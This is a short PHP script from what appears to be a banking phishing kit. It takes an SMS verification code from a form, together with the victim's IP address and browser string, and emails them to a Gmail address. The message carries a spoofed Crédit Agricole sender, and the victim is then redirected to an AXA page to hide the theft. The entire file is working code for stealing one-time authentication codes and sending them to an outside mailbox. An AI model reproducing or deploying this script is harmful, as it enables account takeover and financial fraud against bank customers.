<?php

$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");
$message .= "-------------------| Secure info |-------------------\n";
$message .= "-------------------| CB+ |-------------------\n";
$message .= "SMS        : ".$_POST['ccnum2']."\n";
$message .= "------------------------------------------------------------------\n";
$message .= "--------------------+ Secure Info +--------------------\n";
$message .= "+-----/!\-----| Yoko |-----/!\-----+\n";
$to = "sweetgolf4@gmail.com";
$subj = " sms|".$ip."\n";
$from = "From: SMS <info@creditagricole.fr>";

mail($to, $subj, $message, $from);


header("Location: https://www.axa.fr/compte-bancaire.html");



?>   